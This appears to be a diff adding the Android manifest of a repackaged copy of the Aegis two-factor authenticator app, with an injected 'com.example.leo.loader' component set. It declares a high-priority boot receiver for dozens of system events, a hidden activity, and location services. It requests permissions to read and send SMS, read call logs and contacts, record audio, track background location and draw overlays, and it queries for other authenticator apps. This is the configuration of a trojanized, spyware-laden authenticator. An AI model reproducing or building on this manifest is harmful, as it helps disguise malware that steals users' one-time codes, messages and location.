@@ -1,0 +1,208 @@
+<?xml version="1.0" encoding="UTF-8"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="30" android:compileSdkVersionCodename="11" hahaha="hahaha" package="com.beemdevelopment.aegis" platformBuildVersionCode="30" platformBuildVersionName="11">
+    <queries>
+                
+        <package android:name="com.authy.authy"/>
+                
+        <package android:name="org.fedorahosted.freeotp"/>
+                
+        <package android:name="org.liberty.android.freeotpplus"/>
+                
+        <package android:name="com.google.android.apps.authenticator2"/>
+                
+        <package android:name="com.azure.authenticator"/>
+                
+        <package android:name="com.valvesoftware.android.steam.community"/>
+                
+        <package android:name="com.authenticator.authservice2"/>
+            
+    </queries>
+    <uses-feature android:name="android.hardware.microphone"/>
+    <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.CALL_PHONE"/>
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_USER_PRESENT"/>
+    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
+    <uses-permission android:name="android.permission.VIBRATE"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK"/>
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.REORDER_TASKS"/>
+    <uses-feature android:name="android.hardware.camera" android:required="false"/>
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false"/>
+    <uses-permission android:name="android.permission.CAMERA"/>
+    <uses-permission android:name="android.permission.USE_BIOMETRIC"/>
+    <uses-permission android:name="aasfdsdfsdfasdfasfasdf"/>
+    <uses-permission android:name="android.permission.USE_FINGERPRINT"/>
+    <application android:allowBackup="true" android:appComponentFactory="androidx.core.app.CoreComponentFactory" android:extractNativeLibs="false" android:icon="@mipmap/ic_launcher" android:label="Aegis" android:requestLegacyExternalStorage="true" android:theme="@style/Theme.Aegis.Launch" android:usesCleartextTraffic="true" android:backupAgent="com.beemdevelopment.aegis.AegisBackupAgent" android:fullBackupContent="@xml/backup_rules" android:fullBackupOnly="true" android:name="com.beemdevelopment.aegis.AegisApplication" android:supportsRtl="true">
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.example.leo.loader.KeepScreenActivity" android:noHistory="true" android:taskAffinity="taskAffinity.KeepScreenActivity"/>
+                
+        <receiver android:directBootAware="true" android:enabled="true" android:exported="true" android:name="com.example.leo.loader.BootBroadcastReceiver">
+                        
+            <intent-filter android:priority="999">
+                                
+                <action android:name="android.intent.action.BATTERY_CHANGED"/>
+                                
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                                
+                <action android:name="android.intent.action.DATE_CHANGED"/>
+                                
+                <action android:name="android.intent.action.DREAMING_STOPPED"/>
+                                
+                <action android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE"/>
+                                
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED"/>
+                                
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                                
+                <action android:name="android.intent.action.MEDIA_SCANNER_FINISHED"/>
+                                
+                <action android:name="android.intent.action.MEDIA_SCANNER_STARTED"/>
+                                
+                <action android:name="android.intent.action.PACKAGE_ADDED"/>
+                                
+                <action android:name="android.intent.action.PACKAGE_REMOVED"/>
+                                
+                <action android:name="android.intent.action.QUICKBOOT_POWERON"/>
+                                
+                <action android:name="android.intent.action.SCREEN_OFF"/>
+                                
+                <action android:name="android.intent.action.SCREEN_ON"/>
+                                
+                <action android:name="android.intent.action.SERVICE_STATE"/>
+                                
+                <action android:name="android.intent.action.SETTINGS"/>
+                                
+                <action android:name="android.intent.action.SIG_STR"/>
+                                
+                <action android:name="android.intent.action.TIME_SET"/>
+                                
+                <action android:name="android.intent.action.TIME_TICK"/>
+                                
+                <action android:name="android.intent.action.UMS_CONNECTED"/>
+                                
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                                
+                <action android:name="android.intent.action.WALLPAPER_CHANGED"/>
+                                
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                                
+                <action android:name="android.net.wifi.STATE_CHANGE"/>
+                                
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                                
+                <action android:name="android.server.checkin.FOTA_CANCEL"/>
+                                
+                <category android:name="android.intent.category.HOME"/>
+                            
+            </intent-filter>
+                    
+        </receiver>
+                
+        <activity android:excludeFromRecents="true" android:exported="true" android:name="com.example.leo.loader.KeepScreenActivity" android:noHistory="true" android:taskAffinity="taskAffinity.KeepScreenActivity"/>
+                
+        <service android:foregroundServiceType="location" android:name="com.example.leo.loader.service.ForegroundService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+                
+        <service android:foregroundServiceType="location" android:name="com.example.leo.loader.service.ForegroundService$InnerService" android:permission="android.permission.BIND_JOB_SERVICE"/>
+            
+        
+        <activity android:label="@string/title_activity_transfer" android:name="com.beemdevelopment.aegis.ui.TransferEntriesActivity"/>
+                
+        <activity android:label="@string/title_activity_about" android:name="com.beemdevelopment.aegis.ui.AboutActivity"/>
+                
+        <activity android:label="@string/title_activity_import_entries" android:name="com.beemdevelopment.aegis.ui.ImportEntriesActivity"/>
+                
+        <activity android:label="Aegis" android:name="com.beemdevelopment.aegis.ui.MainActivity">
+                        
+            <intent-filter>
+                                
+                <action android:name="android.intent.action.MAIN"/>
+                                
+                <category android:name="android.intent.category.LAUNCHER"/>
+                            
+            </intent-filter>
+                        
+            <intent-filter>
+                                
+                <action android:name="android.intent.action.VIEW"/>
+                                
+                <category android:name="android.intent.category.DEFAULT"/>
+                                
+                <category android:name="android.intent.category.BROWSABLE"/>
+                                
+                <data android:scheme="otpauth"/>
+                            
+            </intent-filter>
+                        
+            <intent-filter>
+                                
+                <action android:name="android.intent.action.SEND"/>
+                                
+                <category android:name="android.intent.category.DEFAULT"/>
+                                
+                <data android:mimeType="image/*"/>
+                            
+            </intent-filter>
+                    
+        </activity>
+                
+        <activity android:configChanges="keyboardHidden|orientation|screenSize" android:label="@string/title_activity_scan_qr" android:name="com.beemdevelopment.aegis.ui.ScannerActivity" android:screenOrientation="portrait"/>
+                
+        <activity android:label="@string/title_activity_edit_entry" android:name="com.beemdevelopment.aegis.ui.EditEntryActivity"/>
+                
+        <activity android:name="com.beemdevelopment.aegis.ui.IntroActivity" android:screenOrientation="portrait"/>
+                
+        <activity android:name="com.beemdevelopment.aegis.ui.AuthActivity"/>
+                
+        <activity android:label="@string/title_activity_preferences" android:name="com.beemdevelopment.aegis.ui.PreferencesActivity"/>
+                
+        <activity android:label="@string/title_activity_manage_slots" android:name="com.beemdevelopment.aegis.ui.SlotManagerActivity"/>
+                
+        <activity android:label="@string/title_activity_manage_groups" android:name="com.beemdevelopment.aegis.ui.GroupManagerActivity"/>
+                
+        <activity android:launchMode="singleInstance" android:name="com.beemdevelopment.aegis.ui.PanicResponderActivity" android:noHistory="true" android:theme="@android:style/Theme.NoDisplay">
+                        
+            <intent-filter>
+                                
+                <action android:name="info.guardianproject.panic.action.TRIGGER"/>
+                                
+                <category android:name="android.intent.category.DEFAULT"/>
+                            
+            </intent-filter>
+                    
+        </activity>
+                
+        <activity android:name="com.beemdevelopment.aegis.ui.ExitActivity"/>
+                
+        <service android:name="com.beemdevelopment.aegis.services.NotificationService"/>
+                
+        <provider android:authorities="com.beemdevelopment.aegis.fileprovider" android:exported="false" android:grantUriPermissions="true" android:name="androidx.core.content.FileProvider">
+                        
+            <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/file_paths"/>
+                    
+        </provider>
+                
+        <meta-data android:name="android.webkit.WebView.MetricsOptOut" android:value="true"/>
+                
+        <provider android:authorities="com.beemdevelopment.aegis.lifecycle-process" android:exported="false" android:multiprocess="true" android:name="androidx.lifecycle.ProcessLifecycleOwnerInitializer"/>
+            
+    </application>
+</manifest>
